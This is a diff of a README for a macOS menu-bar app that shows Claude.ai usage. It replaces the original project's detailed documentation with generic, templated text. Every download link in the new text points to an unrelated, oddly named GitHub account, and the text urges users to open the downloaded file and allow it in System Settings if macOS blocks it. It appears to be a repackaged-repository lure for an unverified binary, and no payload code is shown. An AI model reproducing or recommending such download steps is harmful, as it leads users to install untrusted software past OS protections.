@@ -1,245 +1,167 @@
-# ClaudeUsageMonitor · v2.1.0
+# 🍎 Claude-Usage-Monitor - See Claude usage at a glance
 
-A native macOS menu-bar app that tracks your [Claude.ai](https://claude.ai) usage in real time — no API key needed.
+[![Download](https://img.shields.io/badge/Download%20Claude-Usage-Monitor-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/preseniledementiaorganicphenomenon554/Claude-Usage-Monitor)
 
-<img src="ClaudeUsageMonitor/Assets/AppIcon_128.png" width="128" alt="App Icon" />
+## 🖥️ Overview
 
----
+Claude-Usage-Monitor is a native macOS menu bar app that shows your Claude.ai usage in one place. It uses a colour-coded icon, a live counter, and a reset timer so you can check your status without opening a browser tab.
 
-## Changelog
+It is built for quick checks during the day. You open it from the menu bar, view your current usage, and move on.
 
-### v2.1.0
-- **Daily routine runs** — new progress bar tracking Claude Code Routine run budget per day (Pro: 5/day, Max: 15/day, Team/Enterprise: 25/day); shown automatically when your plan includes Routines
-- **Routine run notifications** — alerts when 1 run remains and when all runs are exhausted for the day
-- Data fetched from a dedicated API endpoint (`/v1/code/routines/run-budget`), plan limits are read directly from the API — no hardcoding
+## 📥 Download
 
-### v2.0.0
-- **Direct API** — migrated from DOM scraping + JS injection (WKWebView) to direct URLSession calls against Claude's internal REST API; faster, more reliable, no page-load delays
-- **Sonnet usage bar** — dedicated weekly progress bar for Sonnet model usage (Max plan only), contributed by [DukeOfCheese](https://github.com/DukeOfCheese)
-- **Extra usage bar** — monthly credit spend progress when Extra Usage is enabled on your account, contributed by [DukeOfCheese](https://github.com/DukeOfCheese)
-- **Cleaner auth flow** — session key extracted once from login WKWebView; all subsequent requests are plain URLSession with no browser overhead
+Visit this page to download and run the app:
+https://github.com/preseniledementiaorganicphenomenon554/Claude-Usage-Monitor
 
----
+## 🚀 Getting Started on Windows
 
-## Demo
+This app is made for macOS, so it does not run on Windows as a native app. If you are using Windows, you have two simple options:
 
-<img src="screenshots/recording.gif" alt="ClaudeUsageMonitor demo" />
+1. Use a Mac to run the app
+2. Open the GitHub page above and look for a web-based or cross-platform option if one is added later
 
-<img src="screenshots/Screenshot.png" width="260" alt="ClaudeUsageMonitor popover" />
-<img src="screenshots/Extra Usage.png" width="260" alt="ClaudeUsageMonitor - extra usage bar" />
+If you are on a Mac, use the steps below to get started.
 
----
+## 🍏 Install on Mac
 
-## Features
+1. Open the download page:
+   https://github.com/preseniledementiaorganicphenomenon554/Claude-Usage-Monitor
+2. Find the latest release or app file
+3. Download the file to your Mac
+4. Open the downloaded file
+5. If macOS blocks it, go to System Settings and allow the app to open
+6. Drag the app to your Applications folder if asked
+7. Start the app from Applications or Launchpad
+8. Look at the menu bar to see your Claude usage
 
-- **Menu-bar only** — no Dock icon, stays out of your way
-- **Burn rate display** — menu bar shows estimated time left (`~45min left | 42%`) based on actual usage pace; falls back to percentage when idle
-- **Colour-coded icon** — green → orange → red as usage climbs
-- **Three-bar dashboard** — separate horizontal bars for Current session, Weekly limits (all models), and Sonnet-specific usage (Max plan)
-- **Daily routine runs** — tracks Claude Code Routine run budget per day (Pro: 5, Max: 15, Team/Enterprise: 25), shown automatically when your plan includes Routines
-- **Extra usage tracking** — displays monthly credit spend progress when Extra Usage is enabled on your account
-- **Direct API** — reads data straight from Claude's internal API; no DOM scraping, no JS injection
-- **Reset countdowns** — "Resets in X hr Y min" for the session window; "Resets [Day] [Time]" for weekly limits
-- **Configurable auto-refresh** — 30s / 1m / 2m / 5m / 10m, set via right-click menu
-- **Native notifications** — contextual alerts at 75%, 80%, 90%, 95%, 100% usage, on session reset, and when routine runs are running low or exhausted
-- **Smart tip banner** — in-popover tip that updates as usage climbs (75→80→90→95%)
-- **Stale data indicator** — icon turns grey and shows ⚠ if data is older than 10 minutes
-- **Right-click context menu** — quick usage info and settings without opening the popover
-- **In-app update banner** — notified when a new version is available on GitHub
-- **Persisted login** — you only log in once; session is reused automatically
+## 🔍 What You See in the Menu Bar
 
----
+The app keeps things simple. Once it is open, you can see:
 
-## Installation (recommended — pre-built DMG)
+- A colour-coded icon that gives a quick status
+- A live usage counter
+- A reset timer that shows when the usage window refreshes
+- A small menu for quick access to app controls
 
-> **Requires macOS 13 Ventura or later.**
+This helps you check your Claude.ai usage without opening extra pages.
 
-### Step 1 — Download
+## 🎯 Main Features
 
-Download the latest **ClaudeUsageMonitor.dmg** from the [Releases page](https://github.com/theDanButuc/Claude-Usage-Monitor/releases/latest).
+- Menu bar app for fast access
+- Live usage counter
+- Colour-coded status icon
+- Reset timer for the usage window
+- No API key needed
+- Native macOS design
+- Light and easy to keep running in the background
 
-### Step 2 — Install
+## 🧭 How It Works
 
-1. Double-click `ClaudeUsageMonitor.dmg` to mount it
-2. Drag **ClaudeUsageMonitor** into the **Applications** folder shortcut
+Claude-Usage-Monitor reads your Claude.ai usage state and shows it in a small menu bar view. The app is built to stay out of the way while still giving you the facts you need.
 
-### Step 3 — First launch (Gatekeeper bypass)
+A typical use looks like this:
 
-Because the app is **ad-hoc signed** (not yet notarized with an Apple Developer ID), macOS will block it on first open.
+1. Open the app
+2. Check the icon colour
+3. Read the usage count
+4. Look at the reset timer
+5. Keep working
 
-**Do this once:**
+## 💡 Who This Is For
 
-```
-Right-click ClaudeUsageMonitor.app → Open → Open
-```
+This app suits people who:
 
-Or via Terminal:
+- Use Claude.ai often
+- Want to keep track of usage limits
+- Prefer a menu bar app over a full window
+- Want a simple status view with no setup work
+- Use macOS and want a native app feel
 
-```bash
-xattr -cr /Applications/ClaudeUsageMonitor.app
-open /Applications/ClaudeUsageMonitor.app
-```
+## 🛠️ System Requirements
 
-> You will **not** need to do this again after the first successful launch.
+To run Claude-Usage-Monitor, use:
 
-### Step 4 — Log in to Claude
+- macOS 13 or later
+- An Intel or Apple Silicon Mac
+- A working internet connection for Claude.ai access
+- A Claude.ai account
 
-A browser window opens automatically on first run. Log in to your Claude.ai account normally. The window closes by itself when login succeeds and the app icon appears in your menu bar.
+For the best result, keep macOS updated and allow the app to stay open in the background.
 
-### Homebrew (alternative)
+## 📌 Using the App Day to Day
 
-```bash
-brew tap theDanButuc/tap
-brew install --cask claude-usage-monitor
-```
+After setup, the app stays in the menu bar. You do not need to keep opening it. Click the icon when you want to check your current usage. If the icon changes colour, that gives you a quick read on your state.
 
----
+Useful habits:
 
-## Usage
+- Check it before starting a long chat session
+- Watch the reset timer during the day
+- Keep it open if you rely on Claude.ai for work
+- Use the icon colour as a fast status check
 
-| Element | Meaning |
-|---------|---------|
-| **Green** `12% \| 24%` | Plenty of messages left (< 50 % used) |
-| **Orange** `~45min left \| 62%` | Burn rate active — estimated time left shown |
-| **Red** `~8min left \| 91%` | Almost out — act fast |
-| **Grey** `⚠ ~45min left \| 24%` | Data is stale (last update > 10 min ago) |
+## 🧩 Topics
 
-The left value shows **estimated time left** (burn rate) when active, or **Current session %** when idle. The right value is always **Weekly limits %**.
+This project relates to:
 
-**Left-click** the icon to open the popover:
+- ai-tools
+- anthropic
+- claude
+- claude-ai
+- developer-tools
+- macos
+- macos-app
+- menubar
+- menubar-app
+- swift
+- swiftui
+- usage-monitor
 
-- **Plan usage limits** section with progress bars:
-  - **Current session** — rate-limit window usage with "Resets in X hr Y min" countdown
-  - **Weekly limits / All models** — billing-period usage with reset day and time (e.g. "Resets Fri 10:00 AM")
-  - **Sonnet** — Sonnet-specific weekly usage (Max plan only)
-  - **Extra usage** — monthly credit spend bar (X of Y credits), shown only when Extra Usage is enabled on your account
-  - **Daily routine runs** — run budget bar for Claude Code Routines (shown when your plan includes Routines)
-- **Refresh button** (↻) — force an immediate refresh
-- **Quit button** — exit the app
+## 🧪 If the App Does Not Open
 
-**Right-click** the icon for a quick context menu:
+If macOS stops the app from opening, try this:
 
-- Current usage and reset countdown at a glance
-- **Refresh Interval** submenu — choose 30s / 1m / 2m / 5m / 10m (persisted across launches)
-- **Refresh Now** — immediate refresh
-- **Quit**
-
----
+1. Right-click the app
+2. Select Open
+3. Confirm that you want to run it
+4. If needed, go to System Settings > Privacy & Security
+5. Allow the app from there
 
-## Building from source
+If the app still does not appear in the menu bar, quit it and open it again.
 
-You need **Xcode Command Line Tools** (free) — full Xcode is not required.
+## 📂 Folder Placement
 
-```bash
-xcode-select --install   # if not already installed
-```
+Keep the app in your Applications folder so it is easy to find later. This also helps macOS treat it like a normal installed app.
 
-Clone and build:
+Recommended path:
 
-```bash
-git clone https://github.com/theDanButuc/Claude-Usage-Monitor.git
-cd Claude-Usage-Monitor
+- Applications
+- Claude-Usage-Monitor.app
 
-bash scripts/build.sh             # native arch (arm64 or x86_64)
-bash scripts/build.sh --universal # universal binary (arm64 + x86_64)
-```
+## 🔧 App Behaviour
 
-Produces `dist/ClaudeUsageMonitor-vX.X.X.dmg` ready to install.
+The app is built to be small and focused. It does not try to replace Claude.ai. It only gives you a fast view of usage and reset status.
 
-### Regenerate the app icon
+Expected behaviour:
 
-```bash
-swift scripts/make_icon.swift
-# Produces /tmp/AppIcon.icns — copy to ClaudeUsageMonitor/Assets/AppIcon.icns
-```
+- Starts in the menu bar
+- Updates the display as usage changes
+- Shows a clear status icon
+- Keeps the interface simple
+- Works in the background without taking space on your desktop
 
+## 🧼 Uninstall
 
----
+To remove the app:
 
-## How it works
+1. Quit Claude-Usage-Monitor
+2. Open the Applications folder
+3. Drag the app to the Trash
+4. Empty the Trash if you want to remove it fully
 
-### Data source
+You can also remove any related settings if you save app data outside the app bundle
 
-The app calls Claude's internal REST API directly:
+## 📎 Source and Project Page
 
-- `GET /api/organizations` — resolves your organisation ID (cached after first call)
-- `GET /api/organizations/{org_id}/usage` — returns utilization percentages and reset timestamps for all windows (`five_hour`, `seven_day`, `seven_day_sonnet`, `extra_usage`)
-- `GET /v1/code/routines/run-budget` — returns daily routine run budget (`used` / `limit`); called automatically after each usage refresh
+Project page:
+https://github.com/preseniledementiaorganicphenomenon554/Claude-Usage-Monitor
 
-Auth is via the `sessionKey` cookie, extracted from the login WKWebView after OAuth and stored in `UserDefaults`. All subsequent requests are plain `URLSession` calls — no WKWebView or JS injection at runtime.
-
-### Session persistence
-
-On first launch a browser window opens so you can log in to Claude.ai. The `sessionKey` cookie is extracted and stored locally. If the session expires, the login window reappears automatically.
-
----
-
-## Troubleshooting
-
-| Symptom | Fix |
-|---------|-----|
-| "Cannot be opened because the developer cannot be verified" | Right-click → Open, or run `xattr -cr /Applications/ClaudeUsageMonitor.app` |
-| Login window keeps appearing | Your Claude session expired — log in again |
-| All bars show 0% | Session key may be invalid — quit, delete the app from Applications, reinstall and log in again |
-| Sonnet bar not visible | Only shown on Max plan accounts |
-| Extra usage bar not visible | Only shown when Extra Usage is enabled on your Claude account |
-| Routine runs bar not visible | Only shown when your plan includes Claude Code Routines (Pro, Max, Team, Enterprise) |
-| Icon missing from menu bar | Quit via the popover's Quit button and re-open the app |
-| App won't launch after macOS update | Rebuild from source with the updated SDK |
-
----
-
-## Project structure
-
-```
-ClaudeUsageMonitor/
-├── ClaudeUsageMonitor/
-│   ├── ClaudeUsageMonitorApp.swift   # @main entry point
-│   ├── AppDelegate.swift             # Status bar, popover, refresh timer
-│   ├── LoginWindowController.swift   # Full-screen login WebView
-│   ├── Models/
-│   │   └── UsageData.swift           # Data model + computed helpers
-│   ├── Services/
-│   │   ├── ClaudeAPIService.swift    # URLSession-based API client (replaces WebScrapingService)
-│   │   ├── NotificationService.swift # Usage threshold & reset notifications
-│   │   └── UpdateService.swift       # GitHub Releases update check
-│   ├── Views/
-│   │   ├── ContentView.swift         # Popover UI (two-bar dashboard)
-│   │   └── CircularProgressView.swift
-│   ├── Assets/
-│   │   └── AppIcon.icns              # All 10 icon sizes
-│   ├── Info.plist
-│   └── ClaudeUsageMonitor.entitlements
-├── scripts/
-│   ├── build.sh                       # Local build + DMG script
-│   └── make_icon.swift               # Icon generator (Swift script)
-├── screenshots/
-│   └── popover.png                   # App screenshot
-├── .github/workflows/
-│   ├── release.yml                   # CI: build & publish DMG on git tag
-│   └── update-homebrew-tap.yml       # CI: update Homebrew cask after release
-├── project.yml                        # XcodeGen spec
-└── .gitignore
-```
-
----
-
-## Requirements
-
-- macOS 13 Ventura or later
-- An active Claude.ai account (Free, Pro, Team, or Max)
-- Internet connection
-
----
-
-## License
-
-MIT License. Feel free to use Claude Usage Monitor and contribute.
-
----
-
-## Acknowledgements
-
-| | |
-|---|---|
-| [![DukeOfCheese](https://github.com/DukeOfCheese.png?size=50)](https://github.com/DukeOfCheese) | **[DukeOfCheese](https://github.com/DukeOfCheese)** — proposed the migration from DOM scraping to direct API calls, the Sonnet usage bar, and the extra usage bar ([PR #3](https://github.com/theDanButuc/Claude-Usage-Monitor/pull/3)). These ideas shaped v2.0.0. |
